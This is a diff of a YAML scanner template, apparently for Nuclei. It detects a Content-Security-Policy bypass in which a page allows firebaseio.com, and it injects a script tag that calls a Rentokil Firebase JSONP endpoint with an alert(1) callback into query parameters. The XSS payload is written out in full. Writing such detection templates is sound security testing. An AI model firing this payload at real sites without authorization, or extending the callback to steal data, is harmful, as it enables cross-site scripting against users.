@@ -1,39 +1,45 @@
+flow: http(1) && headless(1)
+headless:
+- fuzzing:
+  - fuzz:
+    - '{{url_encode(injection)}}'
+    mode: single
+    part: query
+    type: replace
+  matchers:
+  - dsl:
+    - firebaseio_rentokil_csp_xss == true
+    type: dsl
+  payloads:
+    injection:
+    - <script src="https://rentokil-domains.firebaseio.com/.json?callback=alert(1)-"></script>
+  steps:
+  - action: navigate
+    args:
+      url: '{{BaseURL}}'
+  - action: waitdialog
+    args:
+      max-duration: 5s
+    name: firebaseio_rentokil_csp_xss
+http:
+- matchers:
+  - condition: and
+    internal: true
+    part: header
+    type: word
+    words:
+    - Content-Security-Policy
+    - firebaseio.com
+  method: GET
+  path:
+  - '{{BaseURL}}'
 id: firebaseio-rentokil-csp-bypass
-
 info:
-  name: Content-Security-Policy Bypass via Firebaseio Rentokil
   author: renniepak,DhiyaneshDK
-  severity: medium
-  reference:
-    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
   metadata:
     verified: true
-  tags: xss,csp-bypass,firebaseio-rentokil
-
-headless:
-  - steps:
-      - action: navigate
-        args:
-          url: "{{BaseURL}}"
-
-      - action: waitdialog
-        name: firebaseio_rentokil_csp_xss
-        args:
-          max-duration: 5s
-
-    payloads:
-      injection:
-        - '<script src="https://rentokil-domains.firebaseio.com/.json?callback=alert(1)-"></script>'
-
-    fuzzing:
-      - part: query
-        type: replace
-        mode: single
-        fuzz:
-          - "{{url_encode(injection)}}"
-
-    matchers:
-      - type: dsl
-        dsl:
-          - "firebaseio_rentokil_csp_xss == true"
-# digest: 490a00463044022054c3ab92216d0010091c7fc568d25c6e9b2f1f3b4063fd9999f8fe38a0978868022019fdf99f9b57c1e95bbea7eba86c4092a47c6f1b19eb84ac6ea9d85ae91f878e:922c64590222798bb761d5b6d8e72950
+  name: Content-Security-Policy Bypass - Firebaseio Rentokil
+  reference:
+  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  severity: medium
+  tags: xss,csp-bypass,firebaseio-rentokil,vuln
